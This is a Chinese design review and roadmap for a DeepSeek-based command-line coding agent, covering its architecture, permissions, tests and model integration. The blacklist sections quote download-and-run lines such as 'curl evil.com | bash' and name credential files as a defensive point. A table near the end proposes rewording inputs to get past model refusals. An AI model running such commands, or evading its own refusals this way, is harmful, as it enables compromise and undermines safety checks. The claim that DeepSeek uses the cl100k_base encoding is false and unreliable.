## 项目全景

当前版本 v0.3.0，完成了设计文档中阶段一 ~ 阶段三的核心基建：

┌────────────┬───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┐
│ 层         │ 已实现组件                                                            
                                                                  │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ Provider   │
DeepseekProvider（SSE流式、指数退避重试、R1推理分离、工具调用参数拼接）
                                                   │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ Agent Loop │ runAgentLoop（状态机：用户输入→模型推理→工具调用→循环）、runPlanMode（
先计划后执行两阶段）、compactMessages（Token 超限时自动历史压缩） │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ 工具系统   │ Tool 接口 + ToolRegistry（zod→JSON
Schema）、8个内置工具（Read/Edit/Write/Bash/Grep/Glob/WebFetch/TodoWrite）
                │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ 权限引擎   │ 三层级匹配（session→project→global）+ 危险命令黑名单
                                                                  │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ MCP 扩展   │ McpClient（stdio/SSE）+ adaptMcpTool（MCP→Tool 适配器）
                                                                  │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ Skills     │ SkillRegistry（always/command/auto 三种触发）、自动关键词匹配注入
                                                                  │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ Hooks      │ HookManager（6个挂载点、优先级排序、中止机制）
                                                                  │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ 会话持久化 │ DiskSessionStore（~/.deepseek-code/sessions/<id>.json）
                                                                  │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ Memory     │ loadMemory（DEEPSEEK.md 用户级+项目级）
                                                                  │
├────────────┼───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┤
│ 配置       │ 三级层叠（环境变量 > 项目级 > 用户级）
                                                                  │
└────────────┴───────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────┘

------------------------------------------------------------------------------------

## 一、进化方向

### 1️⃣ 维度一：Agent 自主决策能力 → 多智能体协作架构

当前状态：单一 Agent Loop，所有推理和工具调用由同一个模型实例完成。

进化方向：

    当前：单一 Agent
    ├─ 用户输入 → 模型 → 工具调用 → 模型 → 工具调用 → 结束

    未来：多智能体编排
    ├─ Orchestrator Agent（任务分解、调度）
    │   ├─ Writer Agent（专注代码生成/修改）
    │   ├─ Reviewer Agent（代码审查、静态分析）
    │   ├─ Debugger Agent（错误诊断、修复建议）
    │   └─ Bash Agent（安全沙箱命令执行）

关键优化点：

    * Loop 层已有 parallel.test.ts，说明并行 Sub-agent 的试验已开始
    * 当前 authorized 工具已并行执行（Promise.all），但多模型实例协作尚未支持
    * 可参考 runPlanMode 的模式扩展为 runSubAgent：将子任务 + 专属 system prompt +
子工具集发给另一个 Provider 实例

### 2️⃣ 维度二：上下文理解与记忆 → 结构化工作区记忆

当前状态：

    * compactMessages 用模型做历史摘要（硬编码 deepseek-v4-flash）
    * DEEPSEEK.md 提供静态记忆
    * Token 估算使用简单 chars/3 经验公式

进化方向：

    当前：线性消息流 + 粗暴截断
    ├─ [system] + [user1] + [assistant1] + [tool1] + ... + [userN]

    未来：结构化工作区记忆
    ├─ [长期记忆] DEEPSEEK.md + session 总结（类似 MemGPT 架构）
    ├─ [工作记忆] 当前任务上下文（最近 N 轮 + 关键文件快照）
    ├─ [文件缓存] 已读文件的 LRU 缓存，避免重复读取
    ├─ [关系图谱] 项目文件之间的依赖关系（导入图、类型引用）

关键优化点：

    * estimateTokens 太粗糙（chars/3），对中文实际编码密度差异大，应使用 tiktoken
精确估算
    * compactMessages 中 hardcode 了
deepseek-v4-flash，应使用当前模型或用户可配置的摘要模型
    * 缺少"渐进式压缩"策略：先舍去最旧的 tool_result（通常最冗长），再压缩
    * Session.readFiles 只有 tracking 没有 LRU eviction，长会话可能膨胀

### 3️⃣ 维度三：工具能力边界 → 动态工具发现与组合

当前状态：

    * 启动时注册固定工具集，ToolRegistry 是静态的
    * MCP 工具通过 loadMcpTools 加载后注册

进化方向：

    当前：静态工具集
    ├─ 8个内置工具 + MCP 适配

    未来：动态工具生态
    ├─ 工具商店（从 registry 远程拉取工具定义）
    ├─ 工具链组合（复合工具 = 多个原子工具编排）
    ├─ 按需加载（不用时不占 Schema 空间，减少 token 消耗）
    ├─ 工具版本管理（兼容多版本并存）
    ├─ 实时工具热加载（不重启进程添加工具）

关键优化点：

    * ToolRegistry.toSchemas() 每次调用都重新生成所有工具的 JSON Schema，应加缓存
    * MCP adapter 使用 z.any() 跳过参数校验，丧失了本地提前校验的能力
    * 缺少"工具调用成功率"统计，模型无法学习哪些工具更可靠
    * TodoWrite 使用全局变量存储，多 session 时互相污染

### 4️⃣ 维度四：安全与可控性 → 细粒度策略引擎

当前状态：

    * 权限引擎三层匹配（session/project/global）
    * 危险命令黑名单基于正则
    * Bash 权限按"特征前缀"粒度记忆

进化方向：

    当前：粗粒度权限
    ├─ allow / deny / ask 三种决策
    ├─ 黑名单正则匹配

    未来：细粒度策略引擎
    ├─ 基于时间窗口的限流（每分钟最多 N 次 Bash）
    ├─ 路径白名单（模型只能写特定目录）
    ├─ 命令模板沙箱（仅允许匹配模板的命令）
    ├─ 敏感信息脱敏（API Key 日志自动过滤）
    ├─ 审计日志 + 回滚能力（每次 Edit/Write 前的自动 git snapshot）
    ├─ 多用户角色（owner / contributor / viewer）

关键优化点：

    * PermissionEngine 的 remember() 只支持 session scope，project 和 global
虽然接口定义了 PermissionScope 但未实现
    * 危险命令黑名单 PATTERNS 不够完备，缺少对管道链 |、重定向 > /dev/null
等组合攻击模式的检测
    * commandPrefix 对 Python/Node 等脚本执行的保护粒度太粗（python 开头的全允许）
    * 缺少输出过滤层：模型可能通过 Bash 工具读取敏感文件（如 .env、id_rsa）

### 5️⃣ 维度五：可观测性 → 全链路可复现追踪

当前状态：

    * JsonlLogger 写结构化日志
    * --debug 模式记录 session 事件

进化方向：

    当前：简单日志
    ├─ JSONL 文件写日志

    未来：全链路可观测
    ├─ OpenTelemetry 集成（trace 跨 provider/tool/loop）
    ├─ 会话回放（从日志重建完整交互过程，用于调试）
    ├─ 成本分析（每次 tool call 的 token 消耗 + 时长）
    ├─ 模型行为异常检测（重复工具调用、无限循环自动熔断）
    ├─ 性能 Profile（工具调用延迟分布、provider 响应时间）

关键优化点：

    * 当前 DeepseekProvider 没有记录每次 API 调用的延迟和重试次数，不利于成本分析
    * JsonlLogger.flush() 是空实现（no-op），async 接口写了但不能保证落盘
    * Agent loop 缺少"工具调用统计"（各工具被调次数、失败率）
    * ConsoleLogger 直接写 process.stderr，多 session 并发时日志交叉

------------------------------------------------------------------------------------

## 二、优先级排序优化点（按 ROI 从高到低）

### 🔴 P0 — 当前可操作的快速优化

┌────────────────────────┬────────────────────┬──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┐
│ 问题                   │ 文件               │ 优化方案                             
                                                                     │
├────────────────────────┼────────────────────┼──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┤
│ 模型名 hardcode        │ compact.ts:127     │ 'deepseek-v4-flash'
应改为引用当前配置模型的参数
 │
├────────────────────────┼────────────────────┼──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┤
│ Token 估算不准         │ compact.ts:33      │ 引入 tiktoken 精确估算 token 数
                                                                     │
├────────────────────────┼────────────────────┼──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┤
│ 并行工具结果顺序       │ loop.ts:232        │ Promise.all 不保序，当前靠 map
顺序重排，但复杂场景可能出错，建议 Promise.allSettled + 结果按输入顺序重排 │
├────────────────────────┼────────────────────┼──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┤
│ TodoWrite 全局变量污染 │ todo-write.ts:32   │ 应迁移到 Session 数据结构中存储
                                                                     │
├────────────────────────┼────────────────────┼──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┤
│ SSE connectSse 空实现  │ mcp/client.ts:108  │ 只是个 stub，实际 SSE 持久连接未实现
                                                                     │
├────────────────────────┼────────────────────┼──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┤
│ Session save 无缓存    │ session/disk.ts:89 │ 每次 save() 全量写磁盘，大 session
有性能问题，应加 debounce 或增量写                                     │
└────────────────────────┴────────────────────┴──────────────────────────────────────
─────────────────────────────────────────────────────────────────────┘

### 🟡 P1 — 中周期演进

┌──────────────────────┬─────────────────────────────────────────────────────────────
───────────────────────────────┐
│ 问题                 │ 优化方案                                                    
                               │
├──────────────────────┼─────────────────────────────────────────────────────────────
───────────────────────────────┤
│ 无 Provider 超时熔断 │ DeepseekProvider 缺少对慢响应的整体超时（stream
过程中可能一直不结束）                     │
├──────────────────────┼─────────────────────────────────────────────────────────────
───────────────────────────────┤
│ compact 时机被动     │ 当前只在 needsCompact 返回 true 时才触发，应在每次
tool_result 追加后主动检查              │
├──────────────────────┼─────────────────────────────────────────────────────────────
───────────────────────────────┤
│ Plugin 体系骨架缺失  │ 虽然有 MCP 适配器，但缺少本地 plugin 包格式（npm package
作为工具包加载）                  │
├──────────────────────┼─────────────────────────────────────────────────────────────
───────────────────────────────┤
│ 测试覆盖率盲区       │ cli 包完全没有测试（设计上允许），但 CLI
的关键路径（REPL、permission prompt）缺少集成测试 │
├──────────────────────┼─────────────────────────────────────────────────────────────
───────────────────────────────┤
│ R1 模型支持退化      │ 当前对 R1 只做了"无工具降级"，但 R1 的 thinking
内容不能回传，Compact 时需特殊处理         │
└──────────────────────┴─────────────────────────────────────────────────────────────
───────────────────────────────┘

### 🟢 P2 — 长期演进

┌─────────────────────────────┬──────────────────────────────────────────────────────
─────────────────┐
│ 方向                        │ 说明                                                 
                 │
├─────────────────────────────┼──────────────────────────────────────────────────────
─────────────────┤
│ Ink TUI                     │ 设计文档中阶段二的 Ink TUI（React 终端渲染）优于当前
readline REPL    │
├─────────────────────────────┼──────────────────────────────────────────────────────
─────────────────┤
│ Sub-agent 并行              │ 设计文档中阶段三的 Sub-agent 并行，当前
parallel.test.ts 已有测试骨架 │
├─────────────────────────────┼──────────────────────────────────────────────────────
─────────────────┤
│ Permission profile 远程同步 │ 团队共享权限配置
                 │
├─────────────────────────────┼──────────────────────────────────────────────────────
─────────────────┤
│ 多模态支持                  │
模型可能输出图片/图表（如架构图），需终端内渲染或打开浏览器           │
├─────────────────────────────┼──────────────────────────────────────────────────────
─────────────────┤
│ IDE 插件                    │ VSCode/WebStorm 插件，复用 @deepseek-code/core 作为
SDK               │
└─────────────────────────────┴──────────────────────────────────────────────────────
─────────────────┘

------------------------------------------------------------------------------------

## 三、架构层面评价

### ✅ 设计亮点

    1. 层间解耦极佳：core 完全不依赖 cli，tools 只依赖 core 接口，monorepo 结构清晰
    2. 事件流架构正确：AsyncGenerator<AgentEvent> 使得 CLI、TUI、IDE
插件可以共用同一核心，渲染层可替换
    3. 扩展点预留充分：Hooks、MCP、Skills、Compact
都在阶段一即预留了口子，没有后期返工的代价
    4. 安全模型扎实：权限三态 + 危险命令黑名单 + 文件已读校验，地基打得牢

### ⚠️ 值得注意的设计债务

    1. TodoWrite 的全局状态：与其他模块的设计哲学（依赖注入、session
隔离）不一致，应该把 todos 移到 Session 或 ToolContext.session 中
    2. ToolContext.session 层级混乱：Session 接口本身就有 readFiles，ToolContext
中又有一个 session: ToolSession 子集，两者重复定义
    3. 配置字段来源展示：getConfigSources() 这个函数的功能更像是调试工具，不应该放在
core 中导出，应该只给 CLI 渲染用
    4. 黑名单正则不完备：isDangerous 只匹配了少数已知危险模式，对 curl http://evil | 
bash、wget -O - http://evil | sh 等常见攻击模式无防护

------------------------------------------------------------------------------------

## 四、工程基建与质量改进建议（基于 v0.3 实测数据）

### 📊 现状总览

| 维度 | 当前状态 | 目标 | 优先级 |
|------|---------|------|--------|
| **Lint** | `"lint": "echo 'lint placeholder'"`（空占位符） | Biome 统一 lint+format | 🔴 P0 |
| **覆盖率** | Statements 62.59% / Branches 76.22% / Functions 68.42% / Lines 62.59% | 全包 ≥80% | 🔴 P0 |
| **CLI 测试** | 0% 覆盖（cli 包完全无测试） | ≥60% | 🔴 P0 |
| **CI 强制阈值** | vitest.config 设了阈值但 CI 不检查 | CI 阻断降覆盖率 PR | 🟡 P1 |
| **E2E 测试** | 无 | 关键路径集成测试 | 🟡 P1 |
| **自动发布** | 无 | CI tag 触发 npm publish | 🟢 P2 |

### 🔴 P0 — 快速可落地的工程改进

#### 1. 接入 Biome（替换 lint 占位符）

当前 `package.json` 中 `lint` 是空脚本，建议接入 [Biome](https://biomejs.dev)：

```json
{
  "scripts": {
    "lint": "biome check packages/",
    "lint:fix": "biome check --apply packages/"
  }
}
```

Biome 优势：
- 比 ESLint 快 10~50 倍（Rust 实现）
- 原生支持 TypeScript，零配置即可工作
- 同时覆盖 lint 和 formatting，无需 prettier

配套 CI 改动：`.github/workflows/ci.yml` 增加 `pnpm lint` 步骤。

#### 2. 补齐测试覆盖率到 80%

当前测试覆盖盲区：

| 文件 | 当前覆盖率 | 建议补充测试 |
|------|-----------|-------------|
| `core/src/agent/plan-mode.ts` | ~0% | 三阶段流程：planning → confirm → execution |
| `tools/src/write.ts` | 无测试 | happy path + 未读文件拒绝 + 新文件写入 |
| `tools/src/glob.ts` | 无测试 | 匹配模式、空结果、负向模式 |
| `tools/src/grep.ts` | 无测试 | 正则、glob、上下文行、无匹配 |
| `tools/src/web-fetch.ts` | 无测试 | 正常抓取、404、超时 |
| `tools/src/todo-write.ts` | 无测试 | 增删改查、跨 session 隔离验证 |
| `cli/src/repl.ts` | 0% | 输入解析、斜杠命令分发 |
| `cli/src/permission-prompt.ts` | 0% | 四种按键响应 |
| `cli/src/render/stream.ts` | 0% | 事件流渲染逻辑 |

推荐测试策略：
- 使用 `FakeProvider` 模式（参考 `loop.test.ts`）测试 plan-mode
- CLI 层将 REPL 逻辑拆为纯函数，降低测试难度
- tools 测试参照 `bash.test.ts` / `edit.test.ts` / `read.test.ts` 的模式

#### 3. CI 强制覆盖率门禁

`vitest.config.ts` 中已配置 80% 阈值，但 CI 未检查退出码。建议：

```yaml
# .github/workflows/ci.yml 增加步骤
- run: pnpm test -- --coverage.thresholds.statements=80
  # vitest 覆盖率不达标会 exit non-zero，CI 自动失败
```

同时增加 `--coverage.thresholds.branches=80` / `functions=80` / `lines=80` 四维检查。

#### 4. CLI 测试体系建设

CLI 包（`packages/cli/`）当前完全没有测试，但它是用户直接交互的入口。建议：

1. **抽离纯逻辑**：将 `repl.ts` 中的命令解析、斜杠命令分发拆为独立函数
2. **mock inquirer**：`@inquirer/prompts` 可通过其 `moduleName` 配置 mock
3. **关键路径覆盖**：
   - `main.ts`：命令行参数解析（`--model`、`--resume`、`--plan`、`--cwd`）
   - `repl.ts`：斜杠命令 `/help`、`/quit`、`/clear`、`/sessions`
   - `permission-prompt.ts`：四种按键（a/A/d/D）的响应逻辑
   - `render/stream.ts`：事件类型到终端输出的映射

### 🟡 P1 — 中周期演进

#### 5. CI/CD 发布流程自动化

```yaml
# .github/workflows/release.yml
on:
  push:
    tags: ['v*']
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v3
      - uses: actions/setup-node@v4
        with: { node-version: '20', registry-url: 'https://registry.npmjs.org' }
      - run: pnpm install --frozen-lockfile
      - run: pnpm -r build
      - run: pnpm -r publish --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
      - uses: softprops/action-gh-release@v2
```

同时建议接入 `changesets` 管理版本和 CHANGELOG。

#### 6. E2E 集成测试

当前测试全用 `FakeProvider` mock，缺少真实工具链的端到端验证：

```
packages/
└── core/
    └── test/
        └── e2e/              # 新增
            ├── fixtures/     # 测试用小型项目
            │   ├── ts-project/    # 含 tsconfig + vitest 配置
            │   └── git-project/   # 含 .git 的小仓库
            ├── edit-and-test.test.ts   # 改文件 → 跑测试 → 验证
            ├── bash-git.test.ts        # git init → add → commit
            └── permission-flow.test.ts # ask → allow → deny 全流程
```

E2E 测试不进 CI（含真实文件 IO，不稳定），标记为 `--runInBand` 本地按需运行。

#### 7. 补充 Provider 支持

当前仅支持 DeepSeek 原生 API。建议增加：

- **OpenAI 兼容 Provider**：提取 `BaseOpenAIProvider` 抽象类，DeepSeek 和 OpenAI 都继承它
  - 一键切换 `deepseek-chat` ↔ `gpt-4o` ↔ `glm-4` 等
  - 配置 `baseUrl` 即可适配任意 OpenAI 兼容 API
- **Ollama 本地 Provider**：支持本地运行 `deepseek-coder`、`codellama` 等模型
  - 适合离线场景和敏感代码不出本机
- **模型自动 fallback**：主模型超时 / 429 限流 / 5xx 时自动切换备用模型
  - 配置：`"modelFallback": ["deepseek-chat", "gpt-4o-mini"]`

#### 8. Bash Guard 增强

当前黑名单在 `permission/blacklist.ts` 中硬编码，建议：

1. **可配置黑名单/白名单**：通过 `permissions.json` 扩展
   ```json
   {
     "bashBlacklist": ["dd if=.* of=.*", "chmod 777"],
     "bashWhitelist": ["git status", "pnpm test"]
   }
   ```
2. **危险命令分级**：
   - 🟢 安全（`ls`、`cat`、`head`）→ 自动 allow
   - 🟡 有风险（`rm`、`mv`、`chmod`）→ ask
   - 🔴 高危（`sudo`、`dd`、`> /dev/`）→ 直接 deny
3. **输出过滤**：Bash 执行结果返回前过滤敏感信息（`.env`、`id_rsa`、`API_KEY` 等模式匹配替换为 `***`）
4. **命令沙箱**（可选）：通过 `--sandbox` 在 Docker 容器中执行命令

### 🟢 P2 — 长期工程改进

#### 9. 贡献者体验增强

| 改进项 | 说明 |
|--------|------|
| **CHANGELOG.md** | 维护版本变更日志，接入 `changesets` 自动生成 |
| **ADR** | 在 `docs/adr/` 下记录架构决策（Architecture Decision Records） |
| **Taskfile / Makefile** | 一键开发命令：`make setup`、`make test`、`make lint` |
| **VSCode 调试配置** | `.vscode/launch.json` 预配置 REPL 调试和测试调试 |
| **测试 UI** | `pnpm test:ui` 启动 vitest 浏览器界面 |

#### 10. 性能与监控

- **ToolRegistry.toSchemas() 缓存**：每次调用重新生成 JSON Schema，应加 memoize
- **Session.save debounce**：当前每次 save() 全量写磁盘，大 session 有性能问题，应加 500ms debounce
- **Token 估算精度**：`estimateTokens` 用 chars/3 对中文不准确，建议引入 `tiktoken`
- **工具调用统计**：记录各工具调用次数、成功率、平均延迟，通过 Hooks 暴露

#### 11. 安全加固

- **黑名单模式增强**：检测管道链（`curl evil.com | bash`）、Base64 编码命令、`eval` 注入等组合攻击
- **敏感文件保护**：模型无法通过 Bash 读取 `.env`、`id_rsa`、`credentials.json` 等模式的文件
- **Git 自动快照**：每次 Edit/Write 前自动 `git stash` 或创建备份，支持 `undo` 命令回滚

---

## 五、DeepSeek 模型深度整合建议

> 本项目的核心定位是"深度适配 DeepSeek 模型的命令行编码 Agent"，因此模型整合不应止于标准 OpenAI 兼容 API 的调用，而应深入到 DeepSeek 各模型的独特能力中去。

### 📊 当前集成现状

| 能力 | 状态 | 文件位置 |
|------|------|---------|
| `deepseek-chat` SSE 流式调用 | ✅ | `provider/deepseek.ts` |
| `deepseek-reasoner` reasoning_content 分离 | ✅ | `provider/deepseek.ts` |
| R1 工具调用自动降级 | ✅ | `agent/loop.ts:51` |
| 429/5xx 指数退避重试 | ✅ | `provider/deepseek.ts:91-102` |
| Token 估算 | ⚠️ chars/3，不精确 | `agent/compact.ts:27-34` |
| 上下文窗口配置 | ⚠️ 64K 硬编码 | `agent/compact.ts:19` |
| compact 摘要模型 | ❌ 硬编码 `deepseek-v4-flash`（不存在） | `agent/compact.ts:127` |
| 模型特定 system prompt | ❌ 无差异化 | `cli/src/main.ts`（system prompt 构建处） |
| R1 thinking 生命周期管理 | ❌ 未处理 | `agent/loop.ts` |
| deepseek-coder FIM 模式 | ❌ 未支持 | — |
| DeepSeek API 高级特性（Prefix Cache、json_object 等） | ❌ 未利用 | `provider/deepseek.ts` |

### 🔴 P0 — 核心模型自适应（高 ROI，快速落地）

#### 1. 模型感知的上下文窗口管理

DeepSeek 各模型上下文长度不同，当前硬编码 64K 会导致 R1（实际 64K reasoning + 8K output）误判或 deepseek-coder（128K）浪费。

```ts
// 模型上下文配置映射（建议新增 `provider/model-capabilities.ts`）
const MODEL_CONTEXT_MAP: Record<string, { context: number; output: number }> = {
  'deepseek-chat':          { context: 64_000,  output: 8_000 },
  'deepseek-chat-v3':      { context: 64_000,  output: 8_000 },
  'deepseek-reasoner':     { context: 64_000,  output: 8_000 },
  'deepseek-reasoner-r1':  { context: 64_000,  output: 8_000 },
  'deepseek-coder':        { context: 128_000, output: 8_000 },
  'deepseek-v4':           { context: 200_000, output: 16_000 },
};
```

**改动位置**：`compact.ts:19` 的 `DEFAULT_MAX_CONTEXT = 64000` 改为根据模型名动态获取。

#### 2. 精确 Token 估算（引入 tiktoken）

当前 `estimateTokens` 用 `chars/3` 对中文极不准确（中文约 1 token≈1.5 chars，英文约 1 token≈4 chars），导致压缩时机偏差大。

建议引入 DeepSeek 官方使用的 **tiktoken** tokenizer（DeepSeek 模型与 GPT-4 同用 `cl100k_base` 编码）：

```ts
// compact.ts — estimateTokens 重构
import { getEncoding } from 'tiktoken';

export function estimateTokens(messages: Message[], model?: string): number {
  const encoding = getEncoding('cl100k_base');
  let tokens = 0;
  for (const m of messages) {
    if (m.content) tokens += encoding.encode(m.content).length;
    if (m.tool_calls) tokens += encoding.encode(JSON.stringify(m.tool_calls)).length;
  }
  return tokens;
}
```

#### 3. R1 工具调用能力重评估

当前 `loop.ts:51` 检测到 R1 就一律 `tools = undefined`：

```ts
const isR1 = model.startsWith('deepseek-reasoner');
// ... 后续 tools = isR1 ? undefined : registry.toSchemas();
```

这个判断可能已过时（DeepSeek API 持续演进中）。建议改进：

- 维护一个**模型能力矩阵**，而非简单地按名前缀判断
- 如果 R1 已支持工具调用，去掉降级逻辑，保留 `thinking_delta` 分离
- 如果仍不支持，增加用户可见的提示而非静默降级

```ts
// 建议新增：provider/model-capabilities.ts
export const MODEL_CAPABILITIES: Record<string, ModelCapability> = {
  'deepseek-chat':     { toolCalls: true,  thinking: false,  maxContext: 64_000 },
  'deepseek-reasoner': { toolCalls: false, thinking: true,   maxContext: 64_000 },
  'deepseek-coder':    { toolCalls: true,  thinking: false,  maxContext: 128_000 },
};

export function getModelCapability(model: string): ModelCapability {
  const base = model.toLowerCase();
  const matched = Object.keys(MODEL_CAPABILITIES).find(k => base.startsWith(k));
  return matched ? MODEL_CAPABILITIES[matched] : MODEL_CAPABILITIES['deepseek-chat'];
}
```

#### 4. 修复 compact 摘要模型名（必现 bug）

`compact.ts:127` 中 `'deepseek-v4-flash'` 这个模型名在 DeepSeek 官方 API 中**不存在**，触发 compact 时必报错。

```ts
// 当前（会报错）：
for await (const ev of provider.stream(
  { model: 'deepseek-v4-flash', messages: summarizeMessages },  // ← 不存在的模型
  signal,
))

// 建议改为：
const summaryModel = opts.summaryModel ?? model ?? 'deepseek-chat';
for await (const ev of provider.stream(
  { model: summaryModel, messages: summarizeMessages },
  signal,
))
```

同时在用户配置中增加可选字段：
```json
{
  "model": "deepseek-chat",
  "summaryModel": "deepseek-chat"
}
```

### 🟡 P1 — 模型特定能力利用

#### 5. R1 Thinking 的完整生命周期管理

当前 R1 的 `thinking_delta` 只是 UI 层面展示，但存在深层问题：

- **官方要求**：R1 的 `reasoning_content` **不能回传**给后续请求
- **当前风险**：`thinking_delta` 被 yield 后未从消息中过滤，可能被意外回传
- **compact 影响**：压缩时 thinking 内容可能被混入摘要 prompt

建议三步修复：

```ts
// 1. loop.ts：保存 assistant 消息时剥离 reasoning_content
if (isR1) {
  session.messages.push({ 
    role: 'assistant', 
    content: assistantContent || null,
    tool_calls: toolCalls.length > 0 ? toolCalls : undefined,
    // 不保存 reasoning_content
  });
}

// 2. compact.ts：摘要时跳过 thinking 轮次
function buildSummarizePrompt(messages: Message[]): string {
  // 现有逻辑 + 跳过纯 thinking 的 assistant 消息
}

// 3. session 持久化：可选保留 thinking（用于回放），加载时清除
```

#### 6. 模型特定 System Prompt

不同 DeepSeek 模型的行为特点差异大，system prompt 应差异化定制：

```ts
const MODEL_SYSTEM_PROMPTS: Record<string, string> = {
  'deepseek-chat': `
你是一个命令行编码助手。你拥有以下工具可用：
- Read / Grep / Glob：了解代码
- Edit / Write：修改代码
- Bash：执行命令和测试
请自主选择工具完成任务。优先使用小步骤，避免一次性修改过多文件。`,

  'deepseek-reasoner': `
你是一个命令行编码助手。注意：
- 你不会直接调用工具（当前 R1 模式
- 请先展示你的推理过程，再给出具体修改方案
- 用户将根据你的方案手动执行操作
- 如用户需要自动执行，请告知切换到 deepseek-chat 模型`,

  'deepseek-coder': `
你是一个专注于代码生成的命令行助手。
- 你擅长生成完整代码文件和长代码片段
- 充分利用你的 128K 长上下文能力
- 优先使用 Write 工具生成完整文件`,
};
```

#### 7. 利用 DeepSeek API 高级特性

DeepSeek API 提供了一些独特能力，当前未充分利用：

| 特性 | 说明 | 应用场景 |
|------|------|---------|
| **Prefix Caching** | 自动缓存请求前缀 KV，相同前缀秒级响应 | Agent loop 中 messages 前缀大多相同，利用此特性可大幅降低延迟 |
| **response_format: json_object** | 强制模型输出合法 JSON | 在工具调用场景设置此项，避免 `PROVIDER_TOOL_ARGS_INVALID` 错误 |
| **Frequency/Presence Penalty** | 控制 token 重复惩罚 | 检测到模型陷入重复工具调用循环时，动态调高 penalty 打破循环 |
| **stop 参数** | 自定义停止词 | 在 compact 摘要请求中设置 stop 标记，精确控制摘要长度 |

```ts
// 在 deepseek.ts 中利用 json_object 模式
// 当模型返回工具调用时，设置 response_format 为 json_object
// 这可以大幅降低 JSON 解析失败率
if (hasToolCalls && supportsJsonMode(model)) {
  payload.response_format = { type: 'json_object' };
}
```

#### 8. R1 Output Token 边界管理

R1 的 output token 限制为 8K（远小于 reasoning），这在实际使用中可能导致：

- 长代码生成被截断
- 多工具调用序列被截断
- 关键信息丢失

建议在 Agent Loop 中增加预判逻辑：

```ts
// loop.ts：检测到 R1 时，主动控制助理回复长度
if (isR1 && assistantContent.length > R1_OUTPUT_SAFE_LIMIT) {
  // 截断或拆分请求
  logger.warn('R1 output 接近上限，建议拆分请求');
}
```

### 🔵 P2 — 模型编排与智能调度

#### 9. 多模型编排路由（Model Routing）

不同 DeepSeek 模型各有所长，可以智能路由任务：

```
用户输入
    │
    ├─ 代码生成/补全 ──→ deepseek-coder (128K 上下文，代码优化)
    │
    ├─ 推理/分析    ──→ deepseek-reasoner (thinking 过程，复杂问题拆解)
    │
    ├─ 文件修改/工具 ──→ deepseek-chat (工具调用支持好，响应快)
    │
    └─ 对话/总结    ──→ deepseek-chat (经济实惠)
```

```ts
// 模型路由逻辑（新增模块 provider/model-router.ts）
function selectModel(task: TaskType, userInput: string): string {
  if (isCodeGenerationTask(userInput)) return 'deepseek-coder';
  if (isComplexReasoningTask(userInput)) return 'deepseek-reasoner';
  return 'deepseek-chat'; // 默认
}
```

这可以在 Agent Loop 层面实现：每轮根据当前任务动态切换 `model`。

#### 10. 模型自动 Fallback 与成本优化

DeepSeek API 可能遇到限流（429）或服务不稳定，建议实现分层 fallback：

```ts
interface ModelFallbackConfig {
  primary: string;              // 'deepseek-reasoner'
  fallbacks: string[];          // ['deepseek-chat', ...]
  fallbackOn: ('429' | '5xx' | 'timeout')[];
  costOptimization: boolean;    // 简单任务用经济模型
}

// 用户配置示例
{
  "model": "deepseek-reasoner",
  "modelFallback": ["deepseek-chat"],
  "fallbackOn": ["429", "5xx", "timeout"]
}
```

#### 11. 模型行为异常检测

DeepSeek 模型在某些场景下会表现特定行为模式，可以针对性处理：

| 异常模式 | 检测方式 | 处理策略 |
|---------|---------|---------|
| 重复工具调用循环 | 连续 N 轮相同 tool_call | 修改 system prompt："请换一种方法" |
| 过度道歉/解释 | assistant 回复远长于 tool result | 截断冗余，使用 TL;DR |
| 拒绝执行（安全对齐过严） | 回复含"我不能""抱歉" | 重新措辞输入，减少安全触发 |
| 幻觉文件路径 | Edit/Write 不存在的路径 | Read 前置校验，路径不存在时自动纠正 |
| JSON 格式错误 | tool args parse 失败 | response_format 强制 JSON + 重试 |

```ts
// 在 Agent Loop 中嵌入行为检测
function detectAnomaly(history: Message[]): AnomalyType | null {
  const recentTools = history.filter(m => m.role === 'tool').slice(-10);
  if (recentTools.length >= 5) {
    const names = new Set(recentTools.map(m => m.name));
    if (names.size <= 2) return 'TOOL_LOOP';
  }
  return null;
}
```

### 📋 优先级汇总

| 优先级 | 建议 | 改动量 | 预期收益 |
|--------|------|--------|---------|
| 🔴 P0 | 模型感知上下文窗口 | 1 文件（compact.ts） | 避免 R1/大上下文模型 token 误判 |
| 🔴 P0 | tiktoken 精确估算 | 2 文件 + 新依赖 | compact 时机准确，节省 token |
| 🔴 P0 | R1 工具调用能力重评估 | 1 文件（loop.ts） | 解锁 R1 工具能力（如果已支持） |
| 🔴 P0 | 修复 compact 摘要模型名 | 1 文件（compact.ts:127） | 🔥 修复必现 bug |
| 🟡 P1 | R1 thinking 完整生命周期 | 2 文件（loop.ts + compact.ts） | 防止 R1 消息污染后续请求 |
| 🟡 P1 | 模型特定 system prompt | 1 文件 | 每个模型发挥最大效能 |
| 🟡 P1 | DeepSeek API 高级特性 | 1 文件（deepseek.ts） | 降低延迟，提高 JSON 成功率 |
| 🟡 P1 | R1 output token 边界管理 | 1 文件（loop.ts） | 防止 R1 在 8K 处截断 |
